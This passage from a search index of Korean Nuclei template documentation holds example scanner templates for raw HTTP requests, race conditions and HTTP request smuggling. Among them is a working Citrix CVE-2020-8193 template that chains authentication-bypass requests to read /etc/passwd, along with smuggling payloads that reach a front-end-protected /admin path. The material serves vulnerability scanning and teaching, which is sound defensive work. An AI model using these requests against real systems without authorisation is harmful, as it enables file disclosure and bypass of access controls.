multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} testing=parameter cookie-reuse : true # \ucfe0\ud0a4 \uc7ac\uc0ac\uc6a9\uc740 \ube0c\ub77c\uc6b0\uc800\uc640 \uac19\uc740 \ubaa8\ub4e0 \uc694\uccad \uac04\uc758 \uc138\uc158\uc744 \uc720\uc9c0\ud569\ub2c8\ub2e4. matchers : - type : word words : - \"Test is test matcher text\"","title":"\uc778\uc99d\uc774 \ud544\uc694\ud55c fuzzing"},{"location":"kr/template-examples/http-fuzzing/#_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 \uac01 \uc694\uccad \uac04\uc5d0 \uc138\uc158\uc744 \uc720\uc9c0 \uad00\ub9ac\ud558\ub294 \uc5f0\uc18d\uc801\uc778 HTTP \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. \uc694\uccad\uc5d0\uc11c \ub370\uc774\ud130\ub97c \ub3d9\uc801\uc73c\ub85c \ucd94\ucd9c\ud558\uace0 \ubcc0\uc218 \uc774\ub984\uc744 \uc0ac\uc6a9\ud558\uc5ec \ub2e4\ub978 \uc694\uccad\uc73c\ub85c \uc7ac\uc0ac\uc6a9\ud55c \ub2e4\uc74c, \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high reference : https://github.com/jas502n/CVE-2020-8193 http : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey # Variable name part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"\ub3d9\uc801 \ubcc0\uc218 \uc9c0\uc6d0"},{"location":"kr/template-examples/http-race-conditions/","text":"\ub2e8\uc77c POST \uc694\uccad\uc73c\ub85c \uacbd\uc7c1 \uc870\uac74 \ud14c\uc2a4\ud2b8. \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 /coupons \uc5d4\ub4dc\ud3ec\uc778\ud2b8\uc5d0 \ub300\ud55c RAW \ud615\uc2dd\uc758 \uc815\uc758\ub41c POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. race_count \uac00 10 \uc73c\ub85c \uc815\uc758\ub418\ubbc0\ub85c \ubaa8\ub4e0 \uc694\uccad\uc5d0 \u200b\u200b\ub300\ud574 \ud568\uaed8 \ubcf4\ub0b8 \ubaa8\ub4e0 \uc694\uccad\uc5d0 \u200b\u200b\ub300\ud55c \ub9c8\uc9c0\ub9c9 \ubc14\uc774\ud2b8\ub97c \ubcf4\uc720\ud558\uc5ec \ub3d9\uc2dc\uc5d0 10\uac1c\uc758 \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. send \uc774\ubca4\ud2b8 \ub3d9\uae30\ud654\ub97c \uc694\uccad\ud569\ub2c8\ub2e4. \ub610\ud55c \uacbd\uc7c1 \uc870\uac74 \uc545\uc6a9\uc774 \uc791\ub3d9\ud558\ub294\uc9c0 \uc5ec\ubd80\ub97c \uc2dd\ubcc4\ud558\ub294 \ub370 \ub3c4\uc6c0\uc774 \ub418\ub294 \uc608\uc0c1 \ucd9c\ub825\uc5d0 \ub300\ud55c \ub2e4\ub978 \ud15c\ud50c\ub9bf\uc73c\ub85c matcher\ub97c \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. id : race-condition-testing info : name : Race Condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Cookie: user_session=42332423342987567896 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 \uc5ec\ub7ec \uc694\uccad\uc73c\ub85c \uacbd\uc7c1 \uc870\uac74 \ud14c\uc2a4\ud2b8. \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 threads \uac00 5 \ub85c \uc124\uc815\ub41c RAW \ud615\uc2dd\uc758 \uc815\uc758\ub41c \uc5ec\ub7ec POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. \uacbd\uc7c1 \uc870\uac74\uc744 \uc545\uc6a9\ud558\uae30 \uc704\ud574 \uc5ec\ub7ec \uc694\uccad\uc744 \ubcf4\ub0b4\uc57c \ud560 \ub54c threads \ub97c \uacbd\uc7c1 \uc870\uac74 \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. threads \ubc88\ud638\ub294 \ub2e4\uc74c\uacfc \uac19\uc544\uc57c \ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc73c\ub85c \ub9cc\ub4dc\ub294 \uc218\uc640 \ub3d9\uc77c\ud574\uc57c \ud558\uba70 \ub2e8\uc77c \uc694\uccad\ub9cc \ud558\ub294 \uacbd\uc6b0\uc5d0\ub294 \ud544\uc694\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. id : race-condition-testing info : name : Race condition testing with multiple requests author : pdteam severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true matchers : - type : status status : - 200","title":"Http race conditions"},{"location":"kr/template-examples/http-race-conditions/#post","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 /coupons \uc5d4\ub4dc\ud3ec\uc778\ud2b8\uc5d0 \ub300\ud55c RAW \ud615\uc2dd\uc758 \uc815\uc758\ub41c POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. race_count \uac00 10 \uc73c\ub85c \uc815\uc758\ub418\ubbc0\ub85c \ubaa8\ub4e0 \uc694\uccad\uc5d0 \u200b\u200b\ub300\ud574 \ud568\uaed8 \ubcf4\ub0b8 \ubaa8\ub4e0 \uc694\uccad\uc5d0 \u200b\u200b\ub300\ud55c \ub9c8\uc9c0\ub9c9 \ubc14\uc774\ud2b8\ub97c \ubcf4\uc720\ud558\uc5ec \ub3d9\uc2dc\uc5d0 10\uac1c\uc758 \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. send \uc774\ubca4\ud2b8 \ub3d9\uae30\ud654\ub97c \uc694\uccad\ud569\ub2c8\ub2e4. \ub610\ud55c \uacbd\uc7c1 \uc870\uac74 \uc545\uc6a9\uc774 \uc791\ub3d9\ud558\ub294\uc9c0 \uc5ec\ubd80\ub97c \uc2dd\ubcc4\ud558\ub294 \ub370 \ub3c4\uc6c0\uc774 \ub418\ub294 \uc608\uc0c1 \ucd9c\ub825\uc5d0 \ub300\ud55c \ub2e4\ub978 \ud15c\ud50c\ub9bf\uc73c\ub85c matcher\ub97c \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. id : race-condition-testing info : name : Race Condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Cookie: user_session=42332423342987567896 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200","title":"\ub2e8\uc77c POST \uc694\uccad\uc73c\ub85c \uacbd\uc7c1 \uc870\uac74 \ud14c\uc2a4\ud2b8."},{"location":"kr/template-examples/http-race-conditions/#_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 threads \uac00 5 \ub85c \uc124\uc815\ub41c RAW \ud615\uc2dd\uc758 \uc815\uc758\ub41c \uc5ec\ub7ec POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. \uacbd\uc7c1 \uc870\uac74\uc744 \uc545\uc6a9\ud558\uae30 \uc704\ud574 \uc5ec\ub7ec \uc694\uccad\uc744 \ubcf4\ub0b4\uc57c \ud560 \ub54c threads \ub97c \uacbd\uc7c1 \uc870\uac74 \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. threads \ubc88\ud638\ub294 \ub2e4\uc74c\uacfc \uac19\uc544\uc57c \ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc73c\ub85c \ub9cc\ub4dc\ub294 \uc218\uc640 \ub3d9\uc77c\ud574\uc57c \ud558\uba70 \ub2e8\uc77c \uc694\uccad\ub9cc \ud558\ub294 \uacbd\uc6b0\uc5d0\ub294 \ud544\uc694\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. id : race-condition-testing info : name : Race condition testing with multiple requests author : pdteam severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true matchers : - type : status status : - 200","title":"\uc5ec\ub7ec \uc694\uccad\uc73c\ub85c \uacbd\uc7c1 \uc870\uac74 \ud14c\uc2a4\ud2b8."},{"location":"kr/template-examples/http-raw/","text":"\uae30\ubcf8 \ud15c\ud50c\ub9bf \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 RAW \ud615\uc2dd\uc758 / \uacbd\ub85c\uc5d0 \ub300\ud55c GET \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\" \uc5ec\ub7ec RAW \uc694\uccad \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 RAW \ud615\uc2dd\uc73c\ub85c GET \ubc0f POST \uc694\uccad\uc744 \uc21c\ucc28\uc801\uc73c\ub85c \uc218\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Http raw"},{"location":"kr/template-examples/http-raw/#_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 RAW \ud615\uc2dd\uc758 / \uacbd\ub85c\uc5d0 \ub300\ud55c GET \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\"","title":"\uae30\ubcf8 \ud15c\ud50c\ub9bf"},{"location":"kr/template-examples/http-raw/#raw","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 RAW \ud615\uc2dd\uc73c\ub85c GET \ubc0f POST \uc694\uccad\uc744 \uc21c\ucc28\uc801\uc73c\ub85c \uc218\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"\uc5ec\ub7ec RAW \uc694\uccad"},{"location":"kr/template-examples/http-smuggling/","text":"\uae30\ubcf8 CL.TE \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' \uae30\ubcf8 TE.CL \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : TE-CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Frontend bypass CL.TE \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : smuggling-bypass-front-end-controls-cl-te info : name : HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"/admin/delete?username=carlos\")' \ucc28\ub4f1 \uc751\ub2f5 \uae30\ubc18 CL.TE \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404' \ucc28\ub4f1 \uc751\ub2f5 \uae30\ubc18 TE.CL \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Http smuggling"},{"location":"kr/template-examples/http-smuggling/#clte","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"\uae30\ubcf8 CL.TE"},{"location":"kr/template-examples/http-smuggling/#tecl","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : TE-CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"\uae30\ubcf8 TE.CL"},{"location":"kr/template-examples/http-smuggling/#frontend-bypass-clte","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : smuggling-bypass-front-end-controls-cl-te info : name : HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"/admin/delete?username=carlos\")'","title":"Frontend bypass CL.TE"},{"location":"kr/template-examples/http-smuggling/#clte_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"\ucc28\ub4f1 \uc751\ub2f5 \uae30\ubc18 CL.TE"},{"location":"kr/template-examples/http-smuggling/#tecl_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub41c \uc798\ubabb\ub41c HTTP POST \uc694\uccad\uc744 \ub9cc\ub4e4\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : 